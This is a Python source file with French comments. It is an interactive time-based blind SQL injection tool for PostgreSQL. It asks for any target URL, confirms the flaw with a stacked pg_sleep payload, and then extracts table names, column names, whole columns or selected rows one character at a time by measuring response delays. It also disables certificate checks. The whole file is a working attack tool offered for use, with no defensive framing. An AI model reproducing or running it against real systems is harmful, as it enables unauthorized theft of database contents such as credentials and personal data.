import requests
import time
import sys
from urllib.parse import quote

# --- CONFIGURATION GLOBALE ---
# Ces variables seront définies par l'utilisateur au lancement
TARGET_URL_TEMPLATE = "" 
SLEEP_TIME = 2.0  # Seuil de détection (en secondes)
SQL_SLEEP = 3     # Temps de pause demandé au serveur

# --- INITIALISATION ---

def configure_attack():
    """Demande à l'utilisateur les paramètres de l'attaque."""
    global TARGET_URL_TEMPLATE, SLEEP_TIME
    
    print("\n--- CONFIGURATION DE LA CIBLE ---")
    print("Veuillez entrer l'URL complète de la cible.")
    print("Utilisez le marqueur '[INJECT]' à l'endroit vulnérable.")
    print("Exemple : http://site.com/page.php?id=[INJECT]&other=1")
    
    url_input = input("\nURL Cible : ").strip()
    
    if "[INJECT]" not in url_input:
        print("\n[!] Erreur : Le marqueur [INJECT] est introuvable dans l'URL.")
        print("Cela sert à indiquer où insérer le payload SQL.")
        sys.exit()
        
    TARGET_URL_TEMPLATE = url_input
    
    print(f"\n[+] Cible configurée : {TARGET_URL_TEMPLATE}")
    print(f"[+] Payload Time-Based (PostgreSQL) prêt.")
    print("-" * 30)

# --- CŒUR DU REACTEUR ---

def make_request(payload):
    """
    Envoie le payload en remplaçant le marqueur [INJECT] dans l'URL.
    """
    # On encode le payload (ex: les espaces deviennent %20)
    encoded_payload = quote(payload)
    
    # On remplace le marqueur par le vrai payload encodé
    full_url = TARGET_URL_TEMPLATE.replace("[INJECT]", encoded_payload)
    
    try:
        start_time = time.time()
        # Désactivation des warnings SSL si on attaque du HTTPS sans certif valide
        requests.get(full_url, verify=False) 
        duration = time.time() - start_time
        return duration >= SLEEP_TIME
    except requests.exceptions.RequestException as e:
        # En cas d'erreur réseau, on considère que ce n'est pas le délai SQL
        return False

def check_injection():
    """Vérifie que l'injection fonctionne avant de commencer."""
    print("\n[*] Calibration de l'injection...")
    
    # Payload de test PostgreSQL
    # NOTE: Si tu attaques autre chose que PostgreSQL, c'est ici qu'il faut changer la syntaxe
    payload = f"1;select case when (1=1) then pg_sleep({SQL_SLEEP}) else pg_sleep(0) end-- -"
    
    print(f"[*] Test avec payload : {payload}")
    
    if make_request(payload):
        print("[v] Serveur vulnérable et réactif (Time-Based).\n")
        return True
    else:
        print("[x] Erreur : Le serveur ne dort pas.")
        print("Causes possibles :")
        print("1. L'URL est fausse.")
        print("2. Le point d'injection n'est pas vulnérable.")
        print("3. Ce n'est pas une base PostgreSQL (syntaxe pg_sleep invalide).")
        sys.exit()

def blind_extraction(query_template, label_type):
    """
    Moteur générique d'extraction.
    query_template : La requête SQL contenant {offset}
    """
    offset = 0
    
    while True:
        extracted_value = ""
        position = 1
        
        if offset == 0:
            print(f"[*] Recherche en cours pour : {label_type}...")

        found_something_at_this_offset = False

        while True:
            char_found = False
            
            # Optimisation : On scanne les caractères imprimables courants
            for char_code in range(32, 127):
                current_char = chr(char_code)
                
                sys.stdout.write(f"\r    Ligne {offset+1} - En cours : {extracted_value}{current_char}")
                sys.stdout.flush()
                
                target_query = query_template.format(offset=offset)
                
                # Payload complexe PostgreSQL
                payload = (
                    f"1;select case when "
                    f"(ascii(substring(({target_query}),{position},1))={char_code}) "
                    f"then pg_sleep({SQL_SLEEP}) else pg_sleep(0) end-- -"
                )
                
                if make_request(payload):
                    extracted_value += current_char
                    char_found = True
                    found_something_at_this_offset = True
                    break 
            
            if not char_found:
                break
            
            position += 1
            
        if not found_something_at_this_offset and extracted_value == "":
            if offset == 0:
                print(f"\r    [!] Aucun résultat trouvé pour cette requête.          ")
            else:
                print(f"\r    [!] Fin des résultats.                                 ")
            break
            
        sys.stdout.write(f"\r    [+] Résultat {offset+1} : {extracted_value}                    \n")
        offset += 1

# --- FONCTIONS DU MENU ---

def scan_tables():
    print("\n--- 1. SCAN DES TABLES (Schema public) ---")
    query = "select table_name::text from information_schema.tables where table_schema=$$public$$ limit 1 offset {offset}"
    blind_extraction(query, "Table")

def scan_columns():
    print("\n--- 2. SCAN DES COLONNES ---")
    table_name = input("Quelle table veux-tu scanner ? : ")
    if not table_name: return
    
    query = f"select column_name::text from information_schema.columns where table_name=$${table_name}$$ limit 1 offset {{offset}}"
    blind_extraction(query, "Colonne")

def dump_all_data():
    print("\n--- 3. DUMP DE TOUTE UNE COLONNE ---")
    table_name = input("Table cible : ")
    col_name = input("Colonne cible : ")
    if not table_name or not col_name: return

    query = f"select {col_name}::text from {table_name} limit 1 offset {{offset}}"
    blind_extraction(query, "Donnée")

def dump_targeted_data():
    print("\n--- 4. DUMP CIBLÉ (WHERE...) ---")
    table_name = input("Table cible : ")
    target_col = input("Colonne à extraire : ")
    where_col = input("Colonne condition : ")
    where_val = input(f"Valeur de la condition : ")
    
    if not table_name or not target_col or not where_col: return

    query = (
        f"select {target_col}::text from {table_name} "
        f"where {where_col}=$${where_val}$$ limit 1 offset {{offset}}"
    )
    
    blind_extraction(query, "Donnée Ciblée")

# --- MENU PRINCIPAL ---

def main():
    print("\n=== GENERIC BLIND SQLi TOOL (PostgreSQL) ===")
    
    # 1. On configure l'URL avant tout
    configure_attack()
    
    # 2. On vérifie si l'injection passe
    check_injection()
    
    while True:
        print("\n--- MENU ---")
        print("1. Lister les TABLES")
        print("2. Lister les COLONNES d'une table")
        print("3. Dumper tout le contenu d'une colonne")
        print("4. Dumper une ligne précise (WHERE x = y)")
        print("5. Quitter")
        
        choice = input("\nTon choix [1-5] : ")
        
        if choice == '1':
            scan_tables()
        elif choice == '2':
            scan_columns()
        elif choice == '3':
            dump_all_data()
        elif choice == '4':
            dump_targeted_data()
        elif choice == '5':
            print("Arrêt du script.")
            break
        else:
            print("Choix invalide.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interruption utilisateur (Ctrl+C). Bye.")